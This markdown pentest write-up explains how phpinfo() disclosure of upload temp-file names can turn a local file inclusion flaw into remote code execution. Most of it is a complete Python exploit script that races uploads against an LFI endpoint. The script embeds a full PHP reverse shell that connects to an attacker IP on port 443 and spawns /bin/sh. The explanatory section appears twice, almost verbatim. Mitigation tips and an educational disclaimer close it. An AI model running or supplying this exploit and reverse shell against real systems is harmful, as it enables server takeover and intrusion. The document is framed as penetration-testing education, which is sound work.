# 🔓 LFI to RCE via phpinfo()

> **Advanced Web Application Penetration Testing Technique**

---
## 🧠 Core Idea (High-Level)

The attack works by chaining **two weak conditions**:

1. **phpinfo() exposed**
    
2. **Local File Inclusion (LFI) vulnerability**
    

Individually, these may seem harmless — together, they can lead to **Remote Code Execution (RCE)**.

---

## 🔗 Vulnerability Chain Explained

### 1️⃣ phpinfo() Exposure

`phpinfo()` displays **internal PHP runtime details**, including:

- Temporary file paths
    
- Upload directory
    
- Request headers
    
- Environment variables
    
- PHP version & configuration
    

👉 This is **information disclosure**, not RCE by itself.

---

### 2️⃣ File Upload Handling (Concept)

When PHP handles uploads:

- Files are stored **temporarily**
    
- The temporary filename exists **briefly**
    
- phpinfo() may **expose the temp file name**
    

⚠️ Normally this file disappears quickly.

---

### 3️⃣ Local File Inclusion (LFI)

If the application:

- Includes files based on user input
    
- Does not properly restrict paths
    

Then an attacker may be able to:

- Include **local system files**
    
- Execute PHP code **if PHP interprets it**
    

---

### 4️⃣ Why This Becomes RCE

If:

- A temporary uploaded file contains PHP code
    
- The attacker learns its temporary path via phpinfo()
    
- The LFI includes that file **before deletion**
    

➡️ PHP executes the uploaded code  
➡️ **RCE achieved**
## 📋 Overview

This document describes a sophisticated exploitation technique that chains **Local File Inclusion (LFI)** vulnerabilities with **Remote Code Execution (RCE)** through PHP's `phpinfo()` function disclosure.

### 🎯 Attack Vector

The technique exploits how PHP's `phpinfo()` reveals environment and request information—including temporary filenames for uploads—allowing an attacker to locate and include uploaded PHP code via an LFI vulnerability.

---

## 🔍 Technique Breakdown

### **Step 1: phpinfo() Data Exposure**

`phpinfo()` prints PHP environment variables including:

- `$_GET` - Query parameters
- `$_POST` - Form data
- `$_FILES` - **Temporary upload paths** (e.g., `/tmp/phpXYZ123`)

The `$_FILES` output reveals temporary filenames that can be targeted for inclusion.

### **Step 2: Multiple Uploads to phpinfo()**

By performing multiple upload POST requests to a script that calls `phpinfo()`, an attacker can observe the temporary filenames generated for each upload on the `phpinfo()` page.

### **Step 3: Mapping Temp File from Upload to LFI**

Once an attacker learns the exact temporary filename (e.g., `/tmp/phpXYZ123`), they can attempt to include that file via a vulnerable LFI endpoint.

### **Step 4: Executing Uploaded PHP Code**

If the uploaded file contains PHP code (for example, a web shell) and the LFI includes that temporary file, the included PHP code will execute—resulting in **Remote Code Execution**.

---

## ⚙️ Key Conditions

For this attack to succeed, the following conditions must be met:

|Condition|Description|
|---|---|
|🔧 **File Uploads Enabled**|The server must allow file uploads (`file_uploads = on`)|
|📄 **phpinfo() Page Access**|There must be access to a `phpinfo()` page that discloses file upload temporary paths|
|🚪 **LFI Vulnerability**|The application must have an LFI vulnerability that allows including arbitrary files|
|🎯 **Control Over Upload Content**|The attacker must be able to control uploaded content and observe temporary file paths via `phpinfo()`|

---

## 🛠️ Exploitation Script Analysis

# 🔓 LFI to RCE via phpinfo()

> **Advanced Web Application Penetration Testing Technique**

---

## 📋 Overview

This document describes a sophisticated exploitation technique that chains **Local File Inclusion (LFI)** vulnerabilities with **Remote Code Execution (RCE)** through PHP's `phpinfo()` function disclosure.

### 🎯 Attack Vector

The technique exploits how PHP's `phpinfo()` reveals environment and request information—including temporary filenames for uploads—allowing an attacker to locate and include uploaded PHP code via an LFI vulnerability.

---

## 🔍 Technique Breakdown

### **Step 1: phpinfo() Data Exposure**

`phpinfo()` prints PHP environment variables including:
- `$_GET` - Query parameters
- `$_POST` - Form data  
- `$_FILES` - **Temporary upload paths** (e.g., `/tmp/phpXYZ123`)

The `$_FILES` output reveals temporary filenames that can be targeted for inclusion.

### **Step 2: Multiple Uploads to phpinfo()**

By performing multiple upload POST requests to a script that calls `phpinfo()`, an attacker can observe the temporary filenames generated for each upload on the `phpinfo()` page.

### **Step 3: Mapping Temp File from Upload to LFI**

Once an attacker learns the exact temporary filename (e.g., `/tmp/phpXYZ123`), they can attempt to include that file via a vulnerable LFI endpoint.

### **Step 4: Executing Uploaded PHP Code**

If the uploaded file contains PHP code (for example, a web shell) and the LFI includes that temporary file, the included PHP code will execute—resulting in **Remote Code Execution**.

---

## ⚙️ Key Conditions

For this attack to succeed, the following conditions must be met:

| Condition | Description |
|-----------|-------------|
| 🔧 **File Uploads Enabled** | The server must allow file uploads (`file_uploads = on`) |
| 📄 **phpinfo() Page Access** | There must be access to a `phpinfo()` page that discloses file upload temporary paths |
| 🚪 **LFI Vulnerability** | The application must have an LFI vulnerability that allows including arbitrary files |
| 🎯 **Control Over Upload Content** | The attacker must be able to control uploaded content and observe temporary file paths via `phpinfo()` |

---

## 🛠️ Exploitation Script Analysis

The provided Python script (`phpinfolfi.py`) automates this attack:

### **Core Components**

```python
#!/usr/bin/python
# Reference: https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
```

#### **1. Setup Function**
```python
def setup(host, port):
    TAG = "Security Test"
    PAYLOAD = """<?php $s\r
    <lots of padding>
    """
```
- Sets target IP and port
- Defines a recognizable TAG for identifying successful execution
- Creates a PAYLOAD with PHP code padded to ~5000 bytes

#### **2. Daemonization**
```python
# pcntl_fork is hardly ever available, but will allow us to daemonise
# our php process and avoid zombies
if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    if ($pid) {
        exit(0);  // Parent exits
    }
}
```
- Attempts to fork the process to avoid zombie processes
- Makes the reverse shell more stable

#### **3. Reverse Shell Connection**
```python
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

$process = proc_open($shell, $descriptorspec, $pipes);
```
- Opens a TCP connection back to the attacker
- Spawns a shell process (`/bin/sh -i`)
- Connects the shell's stdin/stdout/stderr to pipes

#### **4. Main Loop**
```python
while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }
    
    // Wait until a command is sent down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    
    // If we can read from the TCP socket, send data to shell
    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }
    
    // If we can read from shell's STDOUT, send to TCP socket
    if (in_array($pipes[1], $read_a)) {
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }
    
    // If we can read from shell's STDERR, send to TCP socket
    if (in_array($pipes[2], $read_a)) {
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }
}
```
- Continuously monitors the TCP socket and shell pipes
- Relays commands from attacker to shell
- Relays shell output back to attacker

#### **5. HTTP Request Construction**
```python
REQ1_DATA = """-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD

REQ1 = """POST /phpinfo.php?a=""" + padding + """ HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=""" + padding + """\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """ + padding + """\r
HTTP_ACCEPT_LANGUAGE: """ + padding + """\r
HTTP_PRAGMA: """ + padding + """\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s"""
```
- Crafts a multipart/form-data POST request with file upload
- Includes extensive padding in headers and parameters to increase the window for race condition
- The LFI request attempts to include the discovered temp file

---

## 🔐 Security Summary

This method leverages `phpinfo()`'s visibility into internal server details to discover temporary upload filenames and then uses an LFI vulnerability to include and execute those uploaded files—turning an LFI into full RCE.

### **Mitigation Strategies**

✅ **Disable phpinfo() in production** - Never expose `phpinfo()` pages on production servers  
✅ **Validate file uploads** - Restrict file types and sanitize filenames  
✅ **Secure file inclusion** - Use whitelists for file inclusion, never trust user input  
✅ **Disable dangerous PHP functions** - Use `disable_functions` in php.ini to block risky functions  
✅ **Implement proper access controls** - Restrict access to sensitive endpoints

---

## 📚 References

- [Insomnia Security - LFI With PHPInfo Assistance](https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf)
- OWASP Testing Guide - File Inclusion Vulnerabilities
- PHP Security Best Practices

---

## ⚠️ Legal Disclaimer

This documentation is for **educational and authorized security testing purposes only**. Unauthorized access to computer systems is illegal. Always obtain proper authorization before conducting security assessments.

---

*Document created for penetration testing education and awareness*



# phpinfolfi.py
#!/usr/bin/python
# https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf

from __future__ import print_function
import sys
import threading
import socket

def setup(host, port):
    TAG = "Security Test"
    PAYLOAD = """<?php
set_time_limit(0);
$VERSION = "1.0";
$ip = '10.233.1.179';  // CHANGE THIS
$port = 443;           // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    
    if ($pid) {
        exit(0);
    }
    
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }
    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }
    
    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }
    
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    
    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }
    
    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }
    
    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
    if (!$daemon) {
        print "$string\\n";
    }
}
?>"""
    
    padding = "A" * 5000
    
    REQ1_DATA = """-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    
    REQ1 = """POST /phpinfo.php?a=""" + padding + """ HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=""" + padding + """\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """ + padding + """\r
HTTP_ACCEPT_LANGUAGE: """ + padding + """\r
HTTP_PRAGMA: """ + padding + """\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" % (len(REQ1_DATA), host, REQ1_DATA)
    
    LFIREQ = """GET /webpentest/local-file-inclusion-1.php?file=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
"""
    
    return (REQ1, TAG, LFIREQ)


def phpinfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    s.connect((host, port))
    s2.connect((host, port))
    
    s.send(phpinforeq)
    d = ""
    
    while len(d) < offset:
        d += s.recv(offset)
    
    try:
        i = d.index("[tmp_name] =&gt;")
        fn = d[i+17:i+31]
    except ValueError:
        return None
    
    s2.send(lfireq % (fn, host))
    d = s2.recv(4096)
    s.close()
    s2.close()
    
    if d.find(tag) != -1:
        return fn


class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock = l
        self.maxattempts = m
        self.args = args
        
    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter += 1
            
            try:
                x = phpinfoLFI(*self.args)
                if self.event.is_set():
                    break
                if x:
                    print("\nGot it! Shell uploaded to %s" % x)
                    self.event.set()
            except socket.error:
                return


def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(phpinforeq)
    
    d = ""
    while True:
        i = s.recv(4096)
        d += i
        if i == "":
            break
        if i.endswith("0\r\n\r\n"):
            break
    
    s.close()
    i = d.find("[tmp_name] =&gt;")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")
    
    print("found %s at %s" % (d[i:i+10], i))
    return i + 256


def main():
    print("LFI With PHPInfo()")
    print("-=" * 30)
    
    if len(sys.argv) < 2:
        print("Usage: %s host [port] [threads]" % sys.argv[0])
        sys.exit(1)
    
    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error as e:
        print("Error with hostname %s: %s" % (sys.argv[1], e))
        sys.exit(1)
    
    port = 80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError as e:
        print("Error with port %d: %s" % (sys.argv[2], e))
        sys.exit(1)
    
    poolsize = 10
    try:
        poolsize = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError as e:
        print("Error with poolsize %d: %s" % (sys.argv[3], e))
        sys.exit(1)
    
    print("Getting initial offset...")
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()
    
    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()
    
    print("Spawning worker pool (%d)..." % poolsize)
    sys.stdout.flush()
    
    tp = []
    for i in range(0, poolsize):
        tp.append(ThreadWorker(e, l, maxattempts, host, port, reqphp, offset, reqlfi, tag))
    
    for t in tp:
        t.start()
    
    try:
        global counter
        counter = 0
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write("\r% %d / % %d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print()
        if e.is_set():
            print("WOOT! \\o/")
        else:
            print(":-(")
    except KeyboardInterrupt:
        print("\nShuttin' down...")
        e.set()
    
    print("Shuttin' down...")
    for t in tp:
        t.join()


if __name__ == "__main__":
    counter = 0
    main()